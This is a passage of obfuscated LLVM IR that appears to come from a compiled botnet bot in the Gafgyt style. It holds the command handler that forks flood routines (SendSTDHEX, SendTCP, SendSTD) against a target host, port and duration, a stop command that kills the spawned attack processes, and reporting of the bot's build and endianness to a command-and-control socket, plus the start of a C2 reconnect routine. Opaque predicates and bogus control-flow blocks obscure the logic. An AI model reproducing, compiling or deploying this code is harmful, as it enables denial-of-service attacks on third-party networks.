originalBBpart2104:                               ; preds = %originalBB102
  br i1 %799, label %830, label %808

; <label>:808:                                    ; preds = %originalBBpart2104
  %809 = load i32, i32* @x.73
  %810 = load i32, i32* @y.74
  %811 = sub i32 %809, 1
  %812 = mul i32 %809, %811
  %813 = urem i32 %812, 2
  %814 = icmp eq i32 %813, 0
  %815 = icmp slt i32 %810, 10
  %816 = or i1 %814, %815
  br i1 %816, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %808
  %817 = load i8**, i8*** %4, align 8
  %818 = getelementptr inbounds i8*, i8** %817, i64 3
  %819 = load i8*, i8** %818, align 8
  %820 = call i32 @atoi(i8* %819) #9
  %821 = icmp slt i32 %820, 1
  %822 = load i32, i32* @x.73
  %823 = load i32, i32* @y.74
  %824 = sub i32 %822, 1
  %825 = mul i32 %822, %824
  %826 = urem i32 %825, 2
  %827 = icmp eq i32 %826, 0
  %828 = icmp slt i32 %823, 10
  %829 = or i1 %827, %828
  br i1 %829, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %821, label %830, label %831

; <label>:830:                                    ; preds = %originalBBpart2108, %originalBBpart2104, %783
  br label %1091

; <label>:831:                                    ; preds = %originalBBpart2108
  %832 = load i32, i32* @x.73
  %833 = load i32, i32* @y.74
  %834 = sub i32 %832, 1
  %835 = mul i32 %832, %834
  %836 = urem i32 %835, 2
  %837 = icmp eq i32 %836, 0
  %838 = icmp slt i32 %833, 10
  %839 = or i1 %837, %838
  br i1 %839, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %831
  %840 = load i8**, i8*** %4, align 8
  %841 = getelementptr inbounds i8*, i8** %840, i64 1
  %842 = load i8*, i8** %841, align 8
  store i8* %842, i8** %24, align 8
  %843 = load i8**, i8*** %4, align 8
  %844 = getelementptr inbounds i8*, i8** %843, i64 2
  %845 = load i8*, i8** %844, align 8
  %846 = call i32 @atoi(i8* %845) #9
  store i32 %846, i32* %25, align 4
  %847 = load i8**, i8*** %4, align 8
  %848 = getelementptr inbounds i8*, i8** %847, i64 3
  %849 = load i8*, i8** %848, align 8
  %850 = call i32 @atoi(i8* %849) #9
  store i32 %850, i32* %26, align 4
  %851 = load i8*, i8** %24, align 8
  %852 = call i8* @strstr(i8* %851, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %853 = icmp ne i8* %852, null
  %854 = load i32, i32* @x.73
  %855 = load i32, i32* @y.74
  %856 = sub i32 %854, 1
  %857 = mul i32 %854, %856
  %858 = urem i32 %857, 2
  %859 = icmp eq i32 %858, 0
  %860 = icmp slt i32 %855, 10
  %861 = or i1 %859, %860
  br i1 %861, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %853, label %862, label %894

; <label>:862:                                    ; preds = %originalBBpart2112
  %863 = load i8*, i8** %24, align 8
  %864 = call i8* @strtok(i8* %863, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %864, i8** %27, align 8
  br label %865

; <label>:865:                                    ; preds = %891, %862
  %866 = load i32, i32* @x.73
  %867 = load i32, i32* @y.74
  %868 = sub i32 %866, 1
  %869 = mul i32 %866, %868
  %870 = urem i32 %869, 2
  %871 = icmp eq i32 %870, 0
  %872 = icmp slt i32 %867, 10
  %873 = or i1 %871, %872
  br i1 %873, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %865
  %874 = load i8*, i8** %27, align 8
  %875 = icmp ne i8* %874, null
  %876 = load i32, i32* @x.73
  %877 = load i32, i32* @y.74
  %878 = sub i32 %876, 1
  %879 = mul i32 %876, %878
  %880 = urem i32 %879, 2
  %881 = icmp eq i32 %880, 0
  %882 = icmp slt i32 %877, 10
  %883 = or i1 %881, %882
  br i1 %883, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %875, label %884, label %893

; <label>:884:                                    ; preds = %originalBBpart2116
  %885 = call i32 @listFork()
  %886 = icmp ne i32 %885, 0
  br i1 %886, label %891, label %887

; <label>:887:                                    ; preds = %884
  %888 = load i8*, i8** %27, align 8
  %889 = load i32, i32* %25, align 4
  %890 = load i32, i32* %26, align 4
  call void @SendSTDHEX(i8* %888, i32 %889, i32 %890)
  call void @_exit(i32 0) #11
  unreachable

; <label>:891:                                    ; preds = %884
  %892 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %892, i8** %27, align 8
  br label %865

; <label>:893:                                    ; preds = %originalBBpart2116
  br label %902

; <label>:894:                                    ; preds = %originalBBpart2112
  %895 = call i32 @listFork()
  %896 = icmp ne i32 %895, 0
  br i1 %896, label %897, label %898

; <label>:897:                                    ; preds = %894
  br label %1091

; <label>:898:                                    ; preds = %894
  %899 = load i8*, i8** %24, align 8
  %900 = load i32, i32* %25, align 4
  %901 = load i32, i32* %26, align 4
  call void @SendSTDHEX(i8* %899, i32 %900, i32 %901)
  call void @_exit(i32 0) #11
  unreachable

; <label>:902:                                    ; preds = %893
  %903 = load i32, i32* @x.73
  %904 = load i32, i32* @y.74
  %905 = sub i32 %903, 1
  %906 = mul i32 %903, %905
  %907 = urem i32 %906, 2
  %908 = icmp eq i32 %907, 0
  %909 = icmp slt i32 %904, 10
  %910 = or i1 %908, %909
  br i1 %910, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %902
  %911 = load i32, i32* @x.73
  %912 = load i32, i32* @y.74
  %913 = sub i32 %911, 1
  %914 = mul i32 %911, %913
  %915 = urem i32 %914, 2
  %916 = icmp eq i32 %915, 0
  %917 = icmp slt i32 %912, 10
  %918 = or i1 %916, %917
  br i1 %918, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %919

; <label>:919:                                    ; preds = %originalBBpart2120, %originalBBpart2100
  %920 = load i32, i32* @x.73
  %921 = load i32, i32* @y.74
  %922 = sub i32 %920, 1
  %923 = mul i32 %920, %922
  %924 = urem i32 %923, 2
  %925 = icmp eq i32 %924, 0
  %926 = icmp slt i32 %921, 10
  %927 = or i1 %925, %926
  br i1 %927, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %919
  %928 = load i8**, i8*** %4, align 8
  %929 = getelementptr inbounds i8*, i8** %928, i64 0
  %930 = load i8*, i8** %929, align 8
  %931 = call i32 @strcmp(i8* %930, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.117, i32 0, i32 0)) #9
  %932 = icmp ne i32 %931, 0
  %933 = load i32, i32* @x.73
  %934 = load i32, i32* @y.74
  %935 = sub i32 %933, 1
  %936 = mul i32 %933, %935
  %937 = urem i32 %936, 2
  %938 = icmp eq i32 %937, 0
  %939 = icmp slt i32 %934, 10
  %940 = or i1 %938, %939
  br i1 %940, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %932, label %1057, label %941

; <label>:941:                                    ; preds = %originalBBpart2124
  %942 = load i32, i32* @x.73
  %943 = load i32, i32* @y.74
  %944 = sub i32 %942, 1
  %945 = mul i32 %942, %944
  %946 = urem i32 %945, 2
  %947 = icmp eq i32 %946, 0
  %948 = icmp slt i32 %943, 10
  %949 = or i1 %947, %948
  br i1 %949, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %941
  store i32 0, i32* %28, align 4
  store i64 0, i64* %29, align 8
  %950 = load i32, i32* @x.73
  %951 = load i32, i32* @y.74
  %952 = sub i32 %950, 1
  %953 = mul i32 %950, %952
  %954 = urem i32 %953, 2
  %955 = icmp eq i32 %954, 0
  %956 = icmp slt i32 %951, 10
  %957 = or i1 %955, %956
  br i1 %957, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %958

; <label>:958:                                    ; preds = %originalBBpart2138, %originalBBpart2128
  %959 = load i32, i32* @x.73
  %960 = load i32, i32* @y.74
  %961 = sub i32 %959, 1
  %962 = mul i32 %959, %961
  %963 = urem i32 %962, 2
  %964 = icmp eq i32 %963, 0
  %965 = icmp slt i32 %960, 10
  %966 = or i1 %964, %965
  br i1 %966, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %958
  %967 = load i64, i64* %29, align 8
  %968 = load i64, i64* @numpids, align 8
  %969 = icmp ult i64 %967, %968
  %970 = load i32, i32* @x.73
  %971 = load i32, i32* @y.74
  %972 = sub i32 %970, 1
  %973 = mul i32 %970, %972
  %974 = urem i32 %973, 2
  %975 = icmp eq i32 %974, 0
  %976 = icmp slt i32 %971, 10
  %977 = or i1 %975, %976
  br i1 %977, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %969, label %978, label %1019

; <label>:978:                                    ; preds = %originalBBpart2132
  %979 = load i32*, i32** @pids, align 8
  %980 = load i64, i64* %29, align 8
  %981 = getelementptr inbounds i32, i32* %979, i64 %980
  %982 = load i32, i32* %981, align 4
  %983 = icmp ne i32 %982, 0
  br i1 %983, label %984, label %999

; <label>:984:                                    ; preds = %978
  %985 = load i32*, i32** @pids, align 8
  %986 = load i64, i64* %29, align 8
  %987 = getelementptr inbounds i32, i32* %985, i64 %986
  %988 = load i32, i32* %987, align 4
  %989 = call i32 @getpid() #5
  %990 = icmp ne i32 %988, %989
  br i1 %990, label %991, label %999

; <label>:991:                                    ; preds = %984
  %992 = load i32*, i32** @pids, align 8
  %993 = load i64, i64* %29, align 8
  %994 = getelementptr inbounds i32, i32* %992, i64 %993
  %995 = load i32, i32* %994, align 4
  %996 = call i32 @kill(i32 %995, i32 9) #5
  %997 = load i32, i32* %28, align 4
  %998 = add nsw i32 %997, 1
  store i32 %998, i32* %28, align 4
  br label %999

; <label>:999:                                    ; preds = %991, %984, %978
  br label %1000

; <label>:1000:                                   ; preds = %999
  %1001 = load i32, i32* @x.73
  %1002 = load i32, i32* @y.74
  %1003 = sub i32 %1001, 1
  %1004 = mul i32 %1001, %1003
  %1005 = urem i32 %1004, 2
  %1006 = icmp eq i32 %1005, 0
  %1007 = icmp slt i32 %1002, 10
  %1008 = or i1 %1006, %1007
  br i1 %1008, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1000
  %1009 = load i64, i64* %29, align 8
  %1010 = add i64 %1009, 1
  store i64 %1010, i64* %29, align 8
  %1011 = load i32, i32* @x.73
  %1012 = load i32, i32* @y.74
  %1013 = sub i32 %1011, 1
  %1014 = mul i32 %1011, %1013
  %1015 = urem i32 %1014, 2
  %1016 = icmp eq i32 %1015, 0
  %1017 = icmp slt i32 %1012, 10
  %1018 = or i1 %1016, %1017
  br i1 %1018, label %originalBBpart2138, label %originalBB134alteredBB

originalBBpart2138:                               ; preds = %originalBB134
  br label %958

; <label>:1019:                                   ; preds = %originalBBpart2132
  %1020 = load i32, i32* @x.73
  %1021 = load i32, i32* @y.74
  %1022 = sub i32 %1020, 1
  %1023 = mul i32 %1020, %1022
  %1024 = urem i32 %1023, 2
  %1025 = icmp eq i32 %1024, 0
  %1026 = icmp slt i32 %1021, 10
  %1027 = or i1 %1025, %1026
  br i1 %1027, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %1019
  %1028 = load i32, i32* %28, align 4
  %1029 = icmp sgt i32 %1028, 0
  %1030 = load i32, i32* @x.73
  %1031 = load i32, i32* @y.74
  %1032 = sub i32 %1030, 1
  %1033 = mul i32 %1030, %1032
  %1034 = urem i32 %1033, 2
  %1035 = icmp eq i32 %1034, 0
  %1036 = icmp slt i32 %1031, 10
  %1037 = or i1 %1035, %1036
  br i1 %1037, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br i1 %1029, label %1038, label %1039

; <label>:1038:                                   ; preds = %originalBBpart2142
  br label %1040

; <label>:1039:                                   ; preds = %originalBBpart2142
  br label %1040

; <label>:1040:                                   ; preds = %1039, %1038
  %1041 = load i32, i32* @x.73
  %1042 = load i32, i32* @y.74
  %1043 = sub i32 %1041, 1
  %1044 = mul i32 %1041, %1043
  %1045 = urem i32 %1044, 2
  %1046 = icmp eq i32 %1045, 0
  %1047 = icmp slt i32 %1042, 10
  %1048 = or i1 %1046, %1047
  br i1 %1048, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %1040
  %1049 = load i32, i32* @x.73
  %1050 = load i32, i32* @y.74
  %1051 = sub i32 %1049, 1
  %1052 = mul i32 %1049, %1051
  %1053 = urem i32 %1052, 2
  %1054 = icmp eq i32 %1053, 0
  %1055 = icmp slt i32 %1050, 10
  %1056 = or i1 %1054, %1055
  br i1 %1056, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br label %1057

; <label>:1057:                                   ; preds = %originalBBpart2146, %originalBBpart2124
  %1058 = load i8**, i8*** %4, align 8
  %1059 = getelementptr inbounds i8*, i8** %1058, i64 0
  %1060 = load i8*, i8** %1059, align 8
  %1061 = call i32 @strcmp(i8* %1060, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.118, i32 0, i32 0)) #9
  %1062 = icmp ne i32 %1061, 0
  br i1 %1062, label %1064, label %1063

; <label>:1063:                                   ; preds = %1057
  call void @exit(i32 0) #12
  unreachable

; <label>:1064:                                   ; preds = %1057
  %1065 = load i32, i32* @x.73
  %1066 = load i32, i32* @y.74
  %1067 = sub i32 %1065, 1
  %1068 = mul i32 %1065, %1067
  %1069 = urem i32 %1068, 2
  %1070 = icmp eq i32 %1069, 0
  %1071 = icmp slt i32 %1066, 10
  %1072 = or i1 %1070, %1071
  br i1 %1072, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %1064
  %1073 = load i8**, i8*** %4, align 8
  %1074 = getelementptr inbounds i8*, i8** %1073, i64 0
  %1075 = load i8*, i8** %1074, align 8
  %1076 = call i32 @strcmp(i8* %1075, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.119, i32 0, i32 0)) #9
  %1077 = icmp ne i32 %1076, 0
  %1078 = load i32, i32* @x.73
  %1079 = load i32, i32* @y.74
  %1080 = sub i32 %1078, 1
  %1081 = mul i32 %1078, %1080
  %1082 = urem i32 %1081, 2
  %1083 = icmp eq i32 %1082, 0
  %1084 = icmp slt i32 %1079, 10
  %1085 = or i1 %1083, %1084
  br i1 %1085, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  br i1 %1077, label %1091, label %1086

; <label>:1086:                                   ; preds = %originalBBpart2150
  call void @RemoveTempDirs()
  %1087 = load i32, i32* @mainCommSock, align 4
  %1088 = call i8* @getBuild()
  %1089 = call i32 @getEndianness()
  %1090 = call i32 (i32, i8*, ...) @sockprintf(i32 %1087, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.120, i32 0, i32 0), i8* %1088, i32 %1089)
  br label %1091

; <label>:1091:                                   ; preds = %1086, %originalBBpart2150, %897, %830, %755, %656, %originalBBpart268, %403, %323, %223, %originalBBpart28, %89, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %35
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %1092 = load i8**, i8*** %4, align 8
  %1093 = getelementptr inbounds i8*, i8** %1092, i64 0
  %1094 = load i8*, i8** %1093, align 8
  %1095 = call i32 @strcmp(i8* %1094, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.112, i32 0, i32 0)) #9
  %1096 = icmp ne i32 %1095, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %93
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %133
  %1097 = load i8**, i8*** %4, align 8
  %1098 = getelementptr inbounds i8*, i8** %1097, i64 0
  %1099 = load i8*, i8** %1098, align 8
  %1100 = call i32 @strcmp(i8* %1099, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.113, i32 0, i32 0)) #9
  %1101 = icmp ne i32 %1100, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %164
  %1102 = load i8**, i8*** %4, align 8
  %1103 = getelementptr inbounds i8*, i8** %1102, i64 2
  %1104 = load i8*, i8** %1103, align 8
  %1105 = call i32 @atoi(i8* %1104) #9
  %1106 = icmp eq i32 %1105, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %186
  %1107 = load i8**, i8*** %4, align 8
  %1108 = getelementptr inbounds i8*, i8** %1107, i64 4
  %1109 = load i8*, i8** %1108, align 8
  %1110 = call i32 @atoi(i8* %1109) #9
  %1111 = icmp eq i32 %1110, -1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %253
  %1112 = load i8*, i8** %5, align 8
  %1113 = call i8* @strtok(i8* %1112, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %1113, i8** %11, align 8
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %272
  %1114 = load i8*, i8** %11, align 8
  %1115 = icmp ne i8* %1114, null
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %291
  %1116 = call i32 @listFork()
  %1117 = icmp ne i32 %1116, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %338
  %1118 = load i32, i32* %3, align 4
  %1119 = icmp slt i32 %1118, 6
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %381
  %1120 = load i8**, i8*** %4, align 8
  %1121 = getelementptr inbounds i8*, i8** %1120, i64 6
  %1122 = load i8*, i8** %1121, align 8
  %1123 = call i32 @atoi(i8* %1122) #9
  %1124 = icmp slt i32 %1123, 1
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %426
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %447
  %1125 = load i8**, i8*** %4, align 8
  %1126 = getelementptr inbounds i8*, i8** %1125, i64 5
  %1127 = load i8*, i8** %1126, align 8
  %1128 = call i32 @atoi(i8* %1127) #9
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %468
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %485
  store i32 %486, i32* %17, align 4
  store i32 32, i32* %18, align 4
  %1129 = load i8*, i8** %12, align 8
  %1130 = call i8* @strstr(i8* %1129, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %1131 = icmp ne i8* %1130, null
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %506
  %1132 = load i8*, i8** %12, align 8
  %1133 = call i8* @strtok(i8* %1132, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %1133, i8** %19, align 8
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %525
  %1134 = load i8*, i8** %19, align 8
  %1135 = icmp ne i8* %1134, null
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %561
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %578
  %1136 = load i8*, i8** %12, align 8
  %1137 = load i32, i32* %13, align 4
  %1138 = load i32, i32* %14, align 4
  %1139 = load i8*, i8** %15, align 8
  %1140 = load i32, i32* %17, align 4
  %1141 = load i32, i32* %16, align 4
  %1142 = load i32, i32* %18, align 4
  call void @SendTCP(i8* %1136, i32 %1137, i32 %1138, i8* %1139, i32 %1140, i32 %1141, i32 %1142)
  call void @_exit(i32 0) #11
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %602
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %619
  %1143 = load i8**, i8*** %4, align 8
  %1144 = getelementptr inbounds i8*, i8** %1143, i64 0
  %1145 = load i8*, i8** %1144, align 8
  %1146 = call i32 @strcmp(i8* %1145, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i32 0, i32 0)) #9
  %1147 = icmp ne i32 %1146, 0
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %672
  %1148 = load i8*, i8** %20, align 8
  %1149 = call i8* @strtok(i8* %1148, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %1149, i8** %23, align 8
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %694
  %1150 = call i32 @listFork()
  %1151 = icmp ne i32 %1150, 0
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %713
  %1152 = load i8*, i8** %23, align 8
  %1153 = load i32, i32* %21, align 4
  %1154 = load i32, i32* %22, align 4
  call void @SendSTD(i8* %1152, i32 %1153, i32 %1154)
  call void @_exit(i32 0) #11
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %735
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %761
  %1155 = load i8**, i8*** %4, align 8
  %1156 = getelementptr inbounds i8*, i8** %1155, i64 0
  %1157 = load i8*, i8** %1156, align 8
  %1158 = call i32 @strcmp(i8* %1157, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.116, i32 0, i32 0)) #9
  %1159 = icmp ne i32 %1158, 0
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %786
  %1160 = load i8**, i8*** %4, align 8
  %1161 = getelementptr inbounds i8*, i8** %1160, i64 2
  %1162 = load i8*, i8** %1161, align 8
  %1163 = call i32 @atoi(i8* %1162) #9
  %1164 = icmp slt i32 %1163, 1
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %808
  %1165 = load i8**, i8*** %4, align 8
  %1166 = getelementptr inbounds i8*, i8** %1165, i64 3
  %1167 = load i8*, i8** %1166, align 8
  %1168 = call i32 @atoi(i8* %1167) #9
  %1169 = icmp slt i32 %1168, 1
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %831
  %1170 = load i8**, i8*** %4, align 8
  %1171 = getelementptr inbounds i8*, i8** %1170, i64 1
  %1172 = load i8*, i8** %1171, align 8
  store i8* %1172, i8** %24, align 8
  %1173 = load i8**, i8*** %4, align 8
  %1174 = getelementptr inbounds i8*, i8** %1173, i64 2
  %1175 = load i8*, i8** %1174, align 8
  %1176 = call i32 @atoi(i8* %1175) #9
  store i32 %1176, i32* %25, align 4
  %1177 = load i8**, i8*** %4, align 8
  %1178 = getelementptr inbounds i8*, i8** %1177, i64 3
  %1179 = load i8*, i8** %1178, align 8
  %1180 = call i32 @atoi(i8* %1179) #9
  store i32 %1180, i32* %26, align 4
  %1181 = load i8*, i8** %24, align 8
  %1182 = call i8* @strstr(i8* %1181, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %1183 = icmp ne i8* %1182, null
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %865
  %1184 = load i8*, i8** %27, align 8
  %1185 = icmp ne i8* %1184, null
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %902
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %919
  %1186 = load i8**, i8*** %4, align 8
  %1187 = getelementptr inbounds i8*, i8** %1186, i64 0
  %1188 = load i8*, i8** %1187, align 8
  %1189 = call i32 @strcmp(i8* %1188, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.117, i32 0, i32 0)) #9
  %1190 = icmp ne i32 %1189, 0
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %941
  store i32 0, i32* %28, align 4
  store i64 0, i64* %29, align 8
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %958
  %1191 = load i64, i64* %29, align 8
  %1192 = load i64, i64* @numpids, align 8
  %1193 = icmp ult i64 %1191, %1192
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1000
  %1194 = load i64, i64* %29, align 8
  %_ = shl i64 %1194, 1
  %_135 = sub i64 0, %1194
  %gen = add i64 %_135, 1
  %_136 = shl i64 %1194, 1
  %1195 = add i64 %1194, 1
  store i64 %1195, i64* %29, align 8
  br label %originalBB134

originalBB140alteredBB:                           ; preds = %originalBB140, %1019
  %1196 = load i32, i32* %28, align 4
  %1197 = icmp sgt i32 %1196, 0
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %1040
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %1064
  %1198 = load i8**, i8*** %4, align 8
  %1199 = getelementptr inbounds i8*, i8** %1198, i64 0
  %1200 = load i8*, i8** %1199, align 8
  %1201 = call i32 @strcmp(i8* %1200, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.119, i32 0, i32 0)) #9
  %1202 = icmp ne i32 %1201, 0
  br label %originalBB148
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %17 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %15
    i32 16777986, label %16
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.123 to i32), i32* %1, align 4
  br label %18

; <label>:14:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.124 to i32), i32* %1, align 4
  br label %18

; <label>:15:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.125 to i32), i32* %1, align 4
  br label %18

; <label>:16:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.126 to i32), i32* %1, align 4
  br label %18

; <label>:17:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.127 to i32), i32* %1, align 4
  br label %18

; <label>:18:                                     ; preds = %17, %16, %15, %14, %13
  %19 = load i32, i32* %1, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %26

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @x.77
  %9 = load i32, i32* @y.78
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* @mainCommSock, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* @mainCommSock, align 4
  %18 = load i32, i32* @x.77
  %19 = load i32, i32* @y.78
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %0
  %27 = load i32, i32* @currentServer, align 4
  %28 = add nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = icmp eq i64 %29, 1
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %26
  store i32 0, i32* @currentServer, align 4
  br label %51

; <label>:32:                                     ; preds = %26
  %33 = load i32, i32* @x.77
  %34 = load i32, i32* @y.78
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i32, i32* @currentServer, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* @currentServer, align 4
  %43 = load i32, i32* @x.77
  %44 = load i32, i32* @y.78
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
